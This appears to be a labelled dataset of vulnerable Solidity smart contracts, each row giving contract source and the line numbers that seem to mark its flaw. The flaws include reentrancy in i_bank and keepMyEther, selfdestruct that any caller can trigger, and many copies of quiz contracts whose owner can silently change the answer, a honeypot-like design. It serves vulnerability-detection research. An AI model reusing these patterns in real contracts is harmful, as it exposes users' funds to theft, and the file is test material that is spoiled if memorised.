    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract UpgradebleStormSender is OwnedUpgradeabilityStorage, Claimable {
    using SafeMath for uint256;
    event Multisended(uint256 total, address tokenAddress);
    event ClaimedTokens(address token, address owner, uint256 balance);
    function() public payable {}
    function initialize(address _owner) public {
        require(!initialized());
        setOwner(_owner);
        boolStorage[keccak256(""rs_multisender_initialized"")] = true;
    }
    function initialized() public view returns (bool) {
        return boolStorage[keccak256(""rs_multisender_initialized"")];
    }
    function multisendToken(address token, address[] _contributors, uint256[] _balances) public payable {
        if (token == 0x000000000000000000000000000000000000bEEF){
            multisendEther(_contributors, _balances);
        } else {
            uint256 total = 0;
            require(_contributors.length <= 200);
            ERC20 erc20token = ERC20(token);
            uint8 i = 0;
            for (i; i < _contributors.length; i++) {
                erc20token.transferFrom(msg.sender, _contributors[i], _balances[i]);
                total += _balances[i];
            }
            emit Multisended(total, token);
        }
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        require(_contributors.length <= 200);
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i]);
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, 0x000000000000000000000000000000000000bEEF);
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == 0x0) {
            owner().transfer(address(this).balance);
            return;
        }
        ERC20 erc20token = ERC20(_token);
        uint256 balance = erc20token.balanceOf(this);
        erc20token.transfer(owner(), balance);
        emit ClaimedTokens(_token, owner(), balance);
    }
}","[52, 55]"
"pragma solidity ^0.5.11;
contract Poll {
    // The block at which the poll ends and votes can no longer be submitted.
    uint256 public endBlock;
    // Vote is emitted when an account submits a vote with 'choiceID'.
    // This event can be indexed to tally all votes for each choiceID
    event Vote(address indexed voter, uint256 choiceID);
    modifier isActive() {
        require(
            block.number <= endBlock,
            ""poll is over""
        );
        _;
    }
    constructor(uint256 _endBlock) public {
        endBlock = _endBlock;
    }
    /**
     * @dev Vote for the poll's proposal.
     *      Reverts if the poll period is over.
     * @param _choiceID the ID of the option to vote for
     */
    function vote(uint256 _choiceID) external isActive {
        emit Vote(msg.sender, _choiceID);
    }
    /**
     * @dev Destroy the Poll contract after the poll has finished
     *      Reverts if the poll is still active
     */
    function destroy() external {
        require(block.number > endBlock, ""poll is active"");
        selfdestruct(msg.sender);
    }
}","[30, 31, 32]"
"        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(SIG_TRANSFER, to, amount)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            ""BoringERC20: Transfer failed""
        );
    }
    /// @notice Provides a safe ERC20.transferFrom version for different ERC-20 implementations.
    /// Reverts on a failed transfer.
    /// @param token The address of the ERC-20 token.
    /// @param from Transfer tokens from.
    /// @param to Transfer tokens to.
    /// @param amount The token amount.
    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 amount
    ) internal {
        (bool success, bytes memory data) = address(token).call(
            abi.encodeWithSelector(SIG_TRANSFER_FROM, from, to, amount)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            ""BoringERC20: TransferFrom failed""
        );
    }
}
contract BaseBoringBatchable {
    /// @dev Helper function to extract a useful revert message from a failed call.
    /// If the returned data is malformed or not correctly abi encoded then this call can fail itself.
    function _getRevertMsg(bytes memory _returnData)
        internal
        pure
        returns (string memory)
    {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return ""Transaction reverted silently"";
        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }
    /// @notice Allows batched call to self (this contract).
    /// @param calls An array of inputs for each call.
    /// @param revertOnFail If True then reverts after a failed call and stops doing further calls.
    /// @return successes An array indicating the success of a call, mapped one-to-one to `calls`.
    /// @return results An array with the returned data of each function call, mapped one-to-one to `calls`.
    // F1: External is ok here because this is the batch function, adding it to a batch makes no sense
    // F2: Calls in the batch may be payable, delegatecall operates in the same context, so each call in the batch has access to msg.value
    // C3: The length of the loop is fully under user control, so can't be exploited
    // C7: Delegatecall is only used on the same contract, so it's safe
    function batch(bytes[] calldata calls, bool revertOnFail)
        external
        payable
        returns (bool[] memory successes, bytes[] memory results)
    {
        successes = new bool[](calls.length);
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(
                calls[i]
            );
            require(success || !revertOnFail, _getRevertMsg(result));
            successes[i] = success;
            results[i] = result;
        }
    }
}
contract BoringBatchable is BaseBoringBatchable {
    /// @notice Call wrapper that performs `ERC20.permit` on `token`.
    /// Lookup `IERC20.permit`.
    // F6: Parameters can be used front-run the permit and the user's permit will fail (due to nonce or other revert)
    //     if part of a batch this could be used to grief once as the second call would not need the permit
    function permitToken(
        IERC20 token,
        address from,
        address to,
        uint256 amount,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public {
        token.permit(from, to, amount, deadline, v, r, s);
    }
}
interface IRewarder {
    using BoringERC20 for IERC20;
    function onSushiReward(
        uint256 pid,
        address user,
        address recipient,
        uint256 sushiAmount,
        uint256 newLpAmount
    ) external;
    function pendingTokens(
        uint256 pid,
        address user,
        uint256 sushiAmount
    ) external view returns (IERC20[] memory, uint256[] memory);
}
interface IMigratorChef {
    // Take the current LP token address and return the new LP token address.
    // Migrator should have full access to the caller's LP token.
    function migrate(IERC20 token) external returns (IERC20);
}
interface IMasterChef {
    using BoringERC20 for IERC20;
    struct UserInfo {
        uint256 amount; // How many LP tokens the user has provided.
        uint256 rewardDebt; // Reward debt. See explanation below.
    }
    struct PoolInfo {
        IERC20 lpToken; // Address of LP token contract.
        uint256 allocPoint; // How many allocation points assigned to this pool. SUSHI to distribute per block.
        uint256 lastRewardBlock; // Last block number that SUSHI distribution occurs.
        uint256 accSushiPerShare; // Accumulated SUSHI per share, times 1e12. See below.
    }
    function poolInfo(uint256 pid)
        external
        view
        returns (IMasterChef.PoolInfo memory);
    function totalAllocPoint() external view returns (uint256);
    function deposit(uint256 _pid, uint256 _amount) external;
}","[63, 64, 65]"
"interface DToken {
  function withdraw() external returns (bool);
  function getAmountOwed(address _user) external view returns (uint);
  function balanceOf(address _tokenHolder) external view returns (uint);
  function transfer(address _to, uint _amount) external returns (bool success);
  function getERC20() external  view returns (address);
}
// @title A dividend-token holding contract that locks tokens and retrieves dividends for assetManagers
// @notice This contract receives newly minted tokens and retrieves Ether or ERC20 tokens received from the asset
// @author Kyle Dewhurst & Peter Phillips, MyBit Foundation
contract AssetManagerFunds {
  using SafeMath for uint256;
  DBInterface public database;
  Events public events;
  uint256 private transactionNumber;
  // @notice constructor: initializes database
  constructor(address _database, address _events)
  public {
    database = DBInterface(_database);
    events = Events(_events);
  }
  // @notice asset manager can withdraw his dividend fee from assets here
  // @param : address _assetAddress = the address of this asset on the platform
  function withdraw(address _assetAddress)
  external
  nonReentrant
  returns (bool) {
    require(_assetAddress != address(0));
    require(msg.sender == database.addressStorage(keccak256(abi.encodePacked(""asset.manager"", _assetAddress))));
    DToken token = DToken( _assetAddress);
    uint amountOwed;
    uint balanceBefore;
    if (token.getERC20() == address(0)){
      balanceBefore = address(this).balance;
      amountOwed = token.getAmountOwed(address(this));
      require(amountOwed > 0);
      uint balanceAfter = balanceBefore.add(amountOwed);
      require(token.withdraw());
      require(address(this).balance == balanceAfter);
      msg.sender.transfer(amountOwed);
    }
    else {
      amountOwed = token.getAmountOwed(address(this));
      require(amountOwed > 0);
      DToken fundingToken = DToken(token.getERC20());
      balanceBefore = fundingToken.balanceOf(address(this));
      require(token.withdraw());
      require(fundingToken.balanceOf(address(this)).sub(amountOwed) == balanceBefore);
      fundingToken.transfer(msg.sender, amountOwed);
    }
    events.transaction('Asset manager income withdrawn', _assetAddress, msg.sender, amountOwed, token.getERC20());
    return true;
  }
  function retrieveAssetManagerTokens(address[] _assetAddress)
  external
  nonReentrant
  returns (bool) {
    require(_assetAddress.length <= 42);
    uint[] memory payoutAmounts = new uint[](_assetAddress.length);
    address[] memory tokenAddresses = new address[](_assetAddress.length);
    uint8 numEntries;
    for(uint8 i = 0; i < _assetAddress.length; i++){
      require(msg.sender == database.addressStorage(keccak256(abi.encodePacked(""asset.manager"", _assetAddress[i]))) );
      DToken token = DToken(_assetAddress[i]);
      require(address(token) != address(0));
      uint tokensOwed = token.getAmountOwed(address(this));
      if(tokensOwed > 0){
        DToken fundingToken = DToken(token.getERC20());
        uint balanceBefore = fundingToken.balanceOf(address(this));
        uint8 tokenIndex = containsAddress(tokenAddresses, address(token));
        if (tokenIndex < _assetAddress.length) {  payoutAmounts[tokenIndex] = payoutAmounts[tokenIndex].add(tokensOwed); }
        else {
          tokenAddresses[numEntries] = address(fundingToken);
          payoutAmounts[numEntries] = tokensOwed;
          numEntries++;
        }
        require(token.withdraw());
        require(fundingToken.balanceOf(address(this)).sub(tokensOwed) == balanceBefore);
      }
    }
    for(i = 0; i < numEntries; i++){
      require(ERC20(tokenAddresses[i]).transfer(msg.sender, payoutAmounts[i]));
    }
    return true;
  }
  function retrieveAssetManagerETH(address[] _assetAddress)
  external
  nonReentrant
  returns (bool) {
    require(_assetAddress.length <= 93);
    uint weiOwed;
    for(uint8 i = 0; i < _assetAddress.length; i++){
      require(msg.sender == database.addressStorage(keccak256(abi.encodePacked(""asset.manager"", _assetAddress[i]))));
      DToken token = DToken(_assetAddress[i]);
      uint balanceBefore = address(this).balance;
      uint amountOwed = token.getAmountOwed(address(this));
      if(amountOwed > 0){
        uint balanceAfter = balanceBefore.add(amountOwed);
        require(token.withdraw());
        require(address(this).balance == balanceAfter);
        weiOwed = weiOwed.add(amountOwed);
      }
    }
    msg.sender.transfer(weiOwed);",[40]
"pragma solidity ^0.4.0;
contract countGame {
    address public best_gamer;
    uint public count = 0;
    uint public endTime = 1504969200;
    function fund() payable {
        require(now <= endTime);
    }
    function (){
        require(now<=endTime && count<50);
        best_gamer = msg.sender;
        count++;
    }
    function endGame(){
        require(now>endTime || count == 50);
        best_gamer.transfer(this.balance);
    }
}","[15, 16]"
"             AutoPoolBatch5Amount = 0.4 ether;
             MaintenaceFeeAmount = 0.2 ether;
        }
        else if (status == 6 ) {
              referralAamount = 1 ether;
             LevelContributionAmount = 5 ether;
             AutoPoolBatch1Amount = 0.8 ether;
             AutoPoolBatch2Amount = 0.8 ether;
             AutoPoolBatch3Amount = 0.8 ether;
             AutoPoolBatch4Amount = 0.8 ether;
             AutoPoolBatch5Amount = 0.8 ether;
             MaintenaceFeeAmount = 0.25 ether;
        } else if (status == 7 ){
            referralAamount = 2 ether;
             LevelContributionAmount = 8 ether;
             AutoPoolBatch1Amount = 2 ether;
             AutoPoolBatch2Amount = 2 ether;
             AutoPoolBatch3Amount = 2 ether;
             AutoPoolBatch4Amount = 2 ether;
             AutoPoolBatch5Amount = 2 ether;
             MaintenaceFeeAmount = 0.5 ether;
        }
            referralAddress.transfer(referralAamount);
            LevelContribution.transfer(LevelContributionAmount);
            AutoPoolBatch1.transfer(AutoPoolBatch1Amount);
            AutoPoolBatch2.transfer(AutoPoolBatch2Amount);
            AutoPoolBatch3.transfer(AutoPoolBatch3Amount);
            AutoPoolBatch4.transfer(AutoPoolBatch4Amount);
            AutoPoolBatch5.transfer(AutoPoolBatch5Amount);
            MaintenaceFeeAddress.transfer(MaintenaceFeeAmount);
            users[userAddress].userAddress = userAddress;
            users[userAddress].referralAddress = referralAddress;
            users[userAddress].userId = userId;
            users[userAddress].LevelContribution = LevelContribution;
            users[userAddress].AutoPoolBatch1 = AutoPoolBatch1;
            users[userAddress].AutoPoolBatch2 = AutoPoolBatch2;
            users[userAddress].AutoPoolBatch3 = AutoPoolBatch3;
            users[userAddress].AutoPoolBatch4 = AutoPoolBatch4;
            users[userAddress].AutoPoolBatch5 = AutoPoolBatch5;
            lastUserId++;
    }
    function fastTrack(address qr50Address, address affiliateIncome1, address affiliateIncome2,  address rebirthIncome1,
     address rebirthIncome2, address rebirthIncome3,address rebirthIncome4,
        address rebirthIncome5) public payable {
        require(msg.value == 0.14 ether, ""Invalid value"");
            qr50Address.transfer(0.07 ether);
            affiliateIncome1.transfer(0.005 ether);
            affiliateIncome2.transfer(0.005 ether);
            rebirthIncome1.transfer(0.01 ether);
            rebirthIncome2.transfer(0.01 ether);
            rebirthIncome3.transfer(0.01 ether);
            rebirthIncome4.transfer(0.01 ether);
            rebirthIncome5.transfer(0.01 ether);
            MaintenaceFeeAddress.transfer(0.01 ether);
            // lastUserId++;
    }
    function goodDay(address referralAddress, address qr10Address, address level1) public payable {
        require(msg.value == 0.05 ether, ""Invalid value"");
            referralAddress.transfer(0.005 ether);
            qr10Address.transfer(0.005 ether);
            level1.transfer(0.035 ether);
            MaintenaceFeeAddress.transfer(0.005 ether);
            // lastUserId++;
    }
    function greenTrack(address referralAddress1, address referralAddress2, address qr25Address, address level1) public payable {
        require(msg.value == 0.09 ether, ""Invalid value"");
            referralAddress1.transfer(0.005 ether);
            referralAddress2.transfer(0.005 ether);
            qr25Address.transfer(0.0225 ether);
            level1.transfer(0.0525 ether);
            MaintenaceFeeAddress.transfer(0.005 ether);
            // lastUserId++;
    }
    function allTransfer() public onlyOwner {
        MaintenaceFeeAddress.transfer(address(this).balance);
    }
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}","[46, 83]"
"pragma solidity 0.4.24;
/**
 * @title SafeMath
 * @dev Math operations with safety checks that throw on error
 */
library SafeMath {
  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }
  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }
  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }
  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a); 
    return c;
  }
}
contract eTrustmoney {
    event Multisended(uint256 value , address sender);
    using SafeMath for uint256;
    function multisendEther(address[] _contributors, uint256[] _balances) public payable {
        uint256 total = msg.value;
        uint256 i = 0;
        for (i; i < _contributors.length; i++) {
            require(total >= _balances[i] );
            total = total.sub(_balances[i]);
            _contributors[i].transfer(_balances[i]);
        }
        emit Multisended(msg.value, msg.sender);
    }
}","[49, 52]"
"pragma solidity ^0.4.25;
contract enigma
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function SetEnGm(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract enigma_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x598832b3b461a47f162d3eaeff4ac987e58f0e3b02cd2277cf098380f60dcb4c;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract enigma_x
{
    function Play(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract eth_game
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.25;
contract etherSinkhole{
    constructor() public{}
    function destroy() public{
        selfdestruct(msg.sender);
    }
}","[4, 5]"
"pragma solidity ^0.4.23;
contract destroyer {
    function destroy() public {
        selfdestruct(msg.sender);
    }
}
contract fmp is destroyer {
    uint256 public sameVar;
    function test(uint256 _sameVar) external {
        sameVar = _sameVar;
    }
}","[3, 4]"
"pragma solidity ^0.4.20;
contract gioco
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function Start_gioco(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract go_quiz
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function start_go_quiz(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.25;
contract go_to_play
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x9953786a5ed139ad55c6fbf08d1114c24c6a90636c0dfc934d5b3f718a87a74f;
    function Activate(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.20;
contract guess_and_get_the_money
{
    function Guess(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGame(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract guess_it
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function set_game(string _question,string _response) public payable {
        if(responseHash==0x0) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[24]
"pragma solidity ^0.4.20;
contract guess_tw
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGuess_tw(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.20;
contract guess_wis
{
    function Try(string _response)
    external
    payable
    {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value>1 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    function StartGuess_wis(string _question,string _response)
    public
    payable
    {
        if(responseHash==0x0)
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
        }
    }
    function StopGame()
    public
    payable
    {
       require(msg.sender==questionSender);
       msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash)
    public
    payable
    {
        require(msg.sender==questionSender);
        question = _question;
        responseHash = _responseHash;
    }
    function() public payable{}
}",[33]
"pragma solidity ^0.4.24;
// ----------------------------------------------------------------------------
// HODL Ethereum
//
// Pulled from URL: hodlethereum.com
// GitHub: https://github.com/apguerrera/hodl_ethereum
//
// Enjoy.
//
// (c) Adrian Guerrera / Deepyr Pty Ltd and
// HODL Ethereum Project - 2018. The MIT Licence.
// ----------------------------------------------------------------------------
contract hodlEthereum {
    event Hodl(address indexed hodler, uint indexed amount);
    event Party(address indexed hodler, uint indexed amount);
    mapping (address => uint) public hodlers;
    // Set party date -  1st Sept 2018
    uint constant partyTime = 1535760000;
    // Deposit Funds
    function hodl() payable public {
        hodlers[msg.sender] += msg.value;
        emit Hodl(msg.sender, msg.value);
    }
    // Withdrawl Funds
    function party() public {
        require (block.timestamp > partyTime && hodlers[msg.sender] > 0);
        uint value = hodlers[msg.sender];
        hodlers[msg.sender] = 0;
        msg.sender.transfer(value);
        emit Party(msg.sender, value);
    }
}","[21, 26]"
"pragma solidity ^0.4.25;
contract i_bank
{
    function Put(uint _unlockTime)
    public
    payable
    {
        var acc = Acc[msg.sender];
        acc.balance += msg.value;
        acc.unlockTime = _unlockTime>now?_unlockTime:now;
        LogFile.AddMessage(msg.sender,msg.value,""Put"");
    }
    function Collect(uint _am)
    public
    payable
    {
        var acc = Acc[msg.sender];
        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)
        {
            if(msg.sender.call.value(_am)())
            {
                acc.balance-=_am;
                LogFile.AddMessage(msg.sender,_am,""Collect"");
            }
        }
    }
    function() 
    public 
    payable
    {
        Put(0);
    }
    struct Holder   
    {
        uint unlockTime;
        uint balance;
    }
    mapping (address => Holder) public Acc;
    Log LogFile;
    uint public MinSum = 1 ether;    
    function i_bank(address log) public{
        LogFile = Log(log);
    }
}
contract Log 
{
    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }
    Message[] public History;
    Message LastMsg;
    function AddMessage(address _adr,uint _val,string _data)
    public
    {
        LastMsg.Sender = _adr;
        LastMsg.Time = now;
        LastMsg.Val = _val;
        LastMsg.Data = _data;
        History.push(LastMsg);
    }
}","[18, 20, 22]"
"pragma solidity ^0.4.25;
contract just_try
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 2 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x09ea7e5cb34a17473ee2a39f02a07c7567abc900248b26f9b536ce94169c2612;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.25;
contract just_try
{
    function Try(string _response) external payable {
        require(msg.sender == tx.origin);
        if(responseHash == keccak256(_response) && msg.value > 3 ether)
        {
            msg.sender.transfer(this.balance);
        }
    }
    string public question;
    address questionSender;
    bytes32 responseHash;
    bytes32 questionerPin = 0x1f16c7d7ece20a68f8fef9f039c5d0f5d3c4fc690a2df9c9ee5aa78ce0cb398c;
    function ActivateContract(bytes32 _questionerPin, string _question, string _response) public payable {
        if(keccak256(_questionerPin)==questionerPin) 
        {
            responseHash = keccak256(_response);
            question = _question;
            questionSender = msg.sender;
            questionerPin = 0x0;
        }
    }
    function StopGame() public payable {
        require(msg.sender==questionSender);
        msg.sender.transfer(this.balance);
    }
    function NewQuestion(string _question, bytes32 _responseHash) public payable {
        if(msg.sender==questionSender){
            question = _question;
            responseHash = _responseHash;
        }
    }
    function newQuestioner(address newAddress) public {
        if(msg.sender==questionSender)questionSender = newAddress;
    }
    function() public payable{}
}",[26]
"pragma solidity ^0.4.23;
/*
!!! THIS CONTRACT IS EXPLOITABLE AND FOR EDUCATIONAL PURPOSES ONLY !!!
This smart contract allows a user to (insecurely) store funds
in this smart contract and withdraw them at any later point in time
*/
contract keepMyEther {
    mapping(address => uint256) public balances;
    function () payable public {
        balances[msg.sender] += msg.value;
    }
    function withdraw() public {
        msg.sender.call.value(balances[msg.sender])();
        balances[msg.sender] = 0;
    }
}","[10, 13]"
"pragma solidity ^0.4.24;
// *****
// step-by-step.io
// First initial micro-ICO in series
contract Ownable {
    address public owner;
    function Ownable() public {
        owner = msg.sender;
    }
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }
}
contract microICO is Ownable {
    uint public soft_cap = 10 ether;
    uint public end_date = 1532254525;
    address public owner = 0xF08FE88Ed3120e19546EeEE1ebe5E7b2FF66b5e7;
    address[] public holders;
    mapping (address => uint) public holder_balance;
    function myICO() public {
        owner = msg.sender;
        soft_cap = 1 ether; // once we raise min 1 ETH, we can get them and run 1st stage
        end_date = now + 30 days; // otherwise holders can take their money back 30 days later 
    }
    function sendFunds(address _addr) public onlyOwner {
        require (address(this).balance >= soft_cap); // getting $ETH only if soft_cap reached
        _addr.transfer(address(this).balance);
    }
    function withdraw() public {
        uint amount;
        require(now > end_date);// holders can take their money back 30 days later
        amount = holder_balance[msg.sender];
        holder_balance[msg.sender] = 0;
        msg.sender.transfer(amount);
    }
    function () public payable {
        require(msg.value > 0);
        holders.push(msg.sender);
        holder_balance[msg.sender] += msg.value;
    }
